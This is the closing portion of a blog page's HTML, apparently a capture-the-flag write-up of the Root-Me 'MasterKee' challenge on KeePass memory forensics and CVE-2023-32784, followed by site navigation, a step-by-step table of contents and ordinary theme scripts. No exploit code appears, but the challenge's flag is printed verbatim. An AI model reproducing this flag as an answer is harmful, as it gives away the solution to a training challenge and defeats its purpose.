+</h2><p>This challenge was a great way to learn about memory forensics and real-world vulnerabilities like <code>CVE-2023-32784</code>. Always ensure your software is up-to-date to avoid such exploits!</p>
+<hr>
+<p><strong>Flag:</strong> <code>RM{Upd4T3_KeEPas5_t0_2.54}</code></p>
+</div>
+    <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
+    <a
+      class="article-category-link"
+      href="/categories/ctf"
+      data-aos="zoom-in"
+      >ctf</a
+    >
+    </li></ul>
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/forensics"
+        rel="tag"
+        >forensics</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt="N7 CTF CRYPTO"
+              class="lazyload"
+            /><a
+          href="/post/2024-05/2024-05-12-n7ctf-crypto/"
+          aria-label="Prev:N7 CTF CRYPTO"
+          title="Prev:N7 CTF CRYPTO"
+        ></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">N7 CTF CRYPTO</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt="Are We Safe When Registering on University Websites?"
+              class="lazyload"
+            /><a
+          href="/post/2025/08/2025-08-05-student-data-security/"
+          aria-label="Next:Are We Safe When Registering on University Websites?"
+          title="Next:Are We Safe When Registering on University Websites?"
+        ></a>
+        <div class="article-nav-caption">Next</div>
+        <h3 class="article-nav-title">Are We Safe When Registering on University Websites?</h3>
+      </div></nav></article></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2026<span class="footer-info-sep rotate"></span>Mohamed Zahir
+    </div><div>
+        <span class="icon-brush"
+          >&nbsp;3.2k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:21</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >Number of visits&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >Number of visitors&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#step-1-understanding-the-vulnerability">Step 1: Understanding the Vulnerability</a></li>
+    <li><a href="#step-2-using-the-proof-of-concept-script">Step 2: Using the Proof-of-Concept Script</a></li>
+    <li><a href="#step-3-running-the-script">Step 3: Running the Script</a></li>
+    <li><a href="#step-4-analyzing-the-output">Step 4: Analyzing the Output</a></li>
+    <li><a href="#step-5-unlocking-the-keepass-database">Step 5: Unlocking the KeePass Database</a></li>
+    <li><a href="#step-6-success">Step 6: Success!</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Mohamed Zahir"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Mohamed Zahir</div>
+  <div class="sidebar-description">Offensive Security | Master AI &amp; Emerging Tech Student</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">10</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">14</div>
+  </a>
+</div>
+<div class="sidebar-social" ><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/moza369"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div><div class="icon-linkedin sidebar-social-icon">
+      <a
+        href="https://www.linkedin.com/in/mohamed-zahir-24b607295"
+        itemprop="url"
+        target="_blank"
+        aria-label="linkedin"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div><div class="icon-twitter sidebar-social-icon">
+      <a
+        href="https://x.com/M0ZA369"
+        itemprop="url"
+        target="_blank"
+        aria-label="twitter"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a><div class='sidebar-menu-icon icon '>&#xf015;</div><div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a><div class='sidebar-menu-icon icon '>&#xf3ed;</div><div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a><div class='sidebar-menu-icon icon '>&#xf522;</div><div class="sidebar-menu-link">About</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="Friend"
+      ></a><div class='sidebar-menu-icon icon '>&#xf187;</div><div class="sidebar-menu-link">Friend</div>
+    </div></div></div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js"  ></script><script src="/js/aos.js"  ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax ></script><script>
+  var setupFirework = () => {
+    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+      if (window.firework) {
+        const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"#005cc5\",\"#2196f3\",\"#64b5f6\",\"#bbdefb\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+        options.excludeElements = options.excludeelements;
+        delete options.excludeelements;
+        window.firework(options);
+      }
+    }
+  }
+</script><script
+    src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js"
+    defer
+    
+    
+    onload="setupFirework()"
+    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Mohamed Zahir",
+          title: "Master kee root-me",
+          url: "http:\/\/localhost:1313\/post\/2025\/2025-03-16-rootme-masterkee\/",
+          description: " Cracking the MasterKee Challenge: Exploiting CVE-2023-32784 For this challenge, we are provided with two files:\nMasterKee.DMP Masterkee.kdbx The goal is to extract the password from the .DMP file and use it to unlock the KeePass database (Masterkee.kdbx). After some research, I discovered that a …",
+          cover: "http:\/\/localhost:1313\/images\/banner-image.png",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax ></script><script src="/js/tabs.js" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+        }
+        pswp()
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
